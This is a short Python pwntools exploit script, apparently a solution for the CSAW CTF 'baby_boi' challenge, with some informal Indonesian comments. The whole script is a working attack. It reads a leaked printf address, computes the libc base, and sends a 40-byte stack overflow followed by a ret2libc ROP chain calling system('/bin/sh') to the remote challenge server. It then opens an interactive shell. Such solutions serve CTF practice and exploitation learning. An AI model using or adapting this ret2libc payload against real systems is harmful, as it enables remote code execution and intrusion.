from pwn import *
from LibcSearcher import *

local = False

elf = ELF("./baby_boi")
if local:
    s = elf.process()
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    s = remote("pwn.chal.csaw.io", 1005)
    libc = ELF("./libc-2.27.so")


s.recvuntil("am: ")
printf_l = int(s.recvline(),16)
pop_rdi = 0x0000000000400793
ret = 0x000000000040054e

libc.address = printf_l - libc.symbols['printf']
system = libc.symbols['system']
bin_sh = libc.search('/bin/sh').next()

payload = 'A'*40
# payload += ''
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret) #Optional cuy inget inget, biasanya bisa gak pakek ini
payload += p64(system)

s.sendline(payload)
s.interactive()
#
# coba = open("payload.txt","wb")
# coba.write(payload)
# coba.close()
# s.sendline(payload)
# s.interactive()
